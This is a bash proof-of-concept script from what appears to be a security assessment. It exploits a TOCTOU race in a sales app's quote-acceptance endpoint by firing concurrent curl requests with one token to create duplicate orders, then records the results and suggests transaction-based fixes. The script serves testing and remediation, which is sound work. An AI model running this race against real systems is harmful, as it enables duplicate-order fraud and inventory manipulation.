#!/usr/bin/env bash
# RC1 — Quote Acceptance TOCTOU Race Condition
#
# Finding: POST /api/sales/quotes/accept has no transaction around the
# status check + update. Two concurrent requests can both pass the
# "status === 'sent'" check and both create orders from one quote.
#
# Requires: A valid quote acceptance token (UUID from a quote link)
# Impact: Duplicate orders, inventory manipulation, financial fraud
#
# Expected (secure): Second request gets 400 "cannot accept in current status"
# Expected (insecure): Both requests return 200 and create separate orders
#
# CVSS v3: AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N (5.9 Medium, no-auth vector)

set -uo pipefail

TARGET="${TARGET:-10.0.63.14}"
APP_PORT="${APP_PORT:-3000}"
BASE_URL="${BASE_URL:-http://$TARGET:$APP_PORT}"
QUOTE_TOKEN="${QUOTE_TOKEN:-}"
EVIDENCE_FILE="${EVIDENCE_FILE:-$(dirname "$0")/../evidence/RC1-quote-toctou.txt}"
CONCURRENCY="${CONCURRENCY:-10}"

mkdir -p "$(dirname "$EVIDENCE_FILE")"
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

{
echo "================================================================"
echo " RC1: Quote Acceptance TOCTOU Race Condition"
echo " Target: $BASE_URL"
echo " Timestamp: $TIMESTAMP"
echo "================================================================"
echo ""

if [[ -z "$QUOTE_TOKEN" ]]; then
  echo "[!] QUOTE_TOKEN not set."
  echo "    To get a token:"
  echo "    1. Create a quote in the app and send it to a customer"
  echo "    2. The acceptance URL contains the token: /api/sales/quotes/accept?token=<UUID>"
  echo "    3. Export: QUOTE_TOKEN=<uuid-here>"
  echo "    4. Re-run this script"
  echo ""
  echo "    Alternatively, query the database:"
  echo "    SELECT acceptance_token FROM sales_quotes WHERE status = 'sent' LIMIT 1;"
  echo ""
  echo "[*] Skipping live test — showing PoC structure only"
  echo ""
  echo "--- PoC (manual) ---"
  echo "# Fire $CONCURRENCY concurrent accept requests to the same token"
  echo "QUOTE_TOKEN=<your-token-here>"
  echo "for i in \$(seq 1 $CONCURRENCY); do"
  echo "  curl -s -X POST $BASE_URL/api/sales/quotes/accept \\"
  echo "    -H 'Content-Type: application/json' \\"
  echo "    -d \"{\\\"token\\\":\\\"$QUOTE_TOKEN\\\"}\" &"
  echo "done"
  echo "wait"
  echo ""
  echo "# Secure result: only 1x HTTP 200, rest 400 'cannot accept in current status'"
  echo "# Insecure result: multiple HTTP 200 responses, multiple orders created"
  echo "================================================================"
  exit 0
fi

echo "--- Configuration ---"
echo "Quote token: ${QUOTE_TOKEN:0:8}...${QUOTE_TOKEN: -4}"
echo "Concurrency: $CONCURRENCY parallel requests"
echo "Endpoint: POST $BASE_URL/api/sales/quotes/accept"
echo ""

echo "--- Baseline: Check quote status before attack ---"
curl -s --max-time 10 "$BASE_URL/api/sales/quotes/public/$QUOTE_TOKEN" \
  -H "Content-Type: application/json" 2>/dev/null | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(f'Quote status: {d.get(\"status\", \"unknown\")}, validUntil: {d.get(\"validUntil\",\"N/A\")}')" \
  2>/dev/null || echo "Could not fetch quote status (token or endpoint format may differ)"
echo ""

echo "--- Firing $CONCURRENCY concurrent requests ---"
echo "Command: for i in {1..$CONCURRENCY}; do curl -s -X POST .../accept -d token=... & done; wait"
echo ""

TMPDIR_RESULTS=$(mktemp -d)
PIDS=()

for i in $(seq 1 "$CONCURRENCY"); do
  curl -s --max-time 15 -X POST "$BASE_URL/api/sales/quotes/accept" \
    -H "Content-Type: application/json" \
    -d "{\"token\":\"$QUOTE_TOKEN\"}" \
    -w "\n%{http_code}" \
    > "$TMPDIR_RESULTS/req_$i.txt" 2>&1 &
  PIDS+=($!)
done

echo "[*] Waiting for all requests to complete..."
for pid in "${PIDS[@]}"; do
  wait "$pid" 2>/dev/null
done

echo ""
echo "--- Results ---"
SUCCESS=0
ERRORS=0
UNIQUE_ORDERS=()

for i in $(seq 1 "$CONCURRENCY"); do
  RESULT_FILE="$TMPDIR_RESULTS/req_$i.txt"
  HTTP_CODE=$(tail -1 "$RESULT_FILE")
  BODY=$(head -n -1 "$RESULT_FILE")
  ORDER_ID=$(echo "$BODY" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('orderId',''))" 2>/dev/null)

  echo "Request $i: HTTP $HTTP_CODE | $(echo "$BODY" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('error','OK') if 'error' in d else f'orderId={d.get(\"orderId\",\"?\")}' )" 2>/dev/null || echo "$BODY")"

  if [[ "$HTTP_CODE" == "200" ]]; then
    ((SUCCESS++))
    if [[ -n "$ORDER_ID" ]]; then
      UNIQUE_ORDERS+=("$ORDER_ID")
    fi
  else
    ((ERRORS++))
  fi
done

rm -rf "$TMPDIR_RESULTS"

echo ""
echo "--- Analysis ---"
echo "Successful accepts: $SUCCESS / $CONCURRENCY"
echo "Errors: $ERRORS / $CONCURRENCY"

if [[ "$SUCCESS" -gt 1 ]]; then
  echo ""
  echo "RESULT: VULNERABLE — $SUCCESS requests succeeded simultaneously"
  echo "        Race window exploited. Multiple orders created from one quote."
  if [[ ${#UNIQUE_ORDERS[@]} -gt 0 ]]; then
    echo "        Order IDs created:"
    for oid in "${UNIQUE_ORDERS[@]}"; do
      echo "          - $oid"
    done
  fi
  echo ""
  echo "IMPACT: Duplicate order(s) created. Verify in admin > Orders."
  echo "        Financial exposure: multiple fulfilment obligations from one sale."
else
  echo ""
  echo "RESULT: LIKELY SAFE — only 1 request succeeded (or test not conclusive)"
  echo "        Race window may be too small. Try increasing CONCURRENCY=20"
  echo "        or running multiple times. True fix requires SELECT FOR UPDATE."
fi

echo ""
echo "Remediation: Wrap quote acceptance in a DB transaction with SELECT FOR UPDATE"
echo "  or use MikroORM optimistic locking (version field on SalesQuote entity)"
echo "================================================================"
} | tee "$EVIDENCE_FILE"

echo "[+] Evidence saved to: $EVIDENCE_FILE"
